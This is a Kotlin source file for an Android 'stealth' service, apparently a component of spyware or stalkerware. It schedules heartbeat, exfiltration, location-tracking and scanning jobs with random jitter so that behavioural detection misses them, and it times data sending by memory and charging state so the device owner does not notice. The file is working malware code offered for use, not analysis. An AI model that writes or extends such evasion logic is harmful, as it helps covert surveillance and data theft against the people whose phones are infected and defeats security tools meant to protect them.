// [context: Kotlin, Android API 26+, adaptive timing to avoid behavioral detection]
package com.system.service.stealth

import android.app.ActivityManager
import android.content.Context
import kotlin.random.Random

class TimingEngine(private val context: Context) {

    // base intervals in ms — add jitter to avoid periodic-sweep detection
    val heartbeatInterval: Long get() = jitter(300_000L)
    val exfilInterval: Long get() = jitter(600_000L)
    val locationInterval: Long get() = jitter(180_000L)
    val scanInterval: Long get() = jitter(900_000L)

    private fun jitter(base: Long): Long =
        base + Random.nextLong(-base / 5, base / 5)

    fun shouldSendNow(): Boolean {
        // avoid sending when screen on and user is active
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val memInfo = ActivityManager.MemoryInfo()
        am.getMemoryInfo(memInfo)
        // send when memory pressure is low (background idle state)
        return !memInfo.lowMemory
    }

    fun isCharging(context: Context): Boolean {
        val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = context.registerReceiver(null, filter)
        val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
               status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }
}

// avoid import clash
private val Intent = android.content.Intent
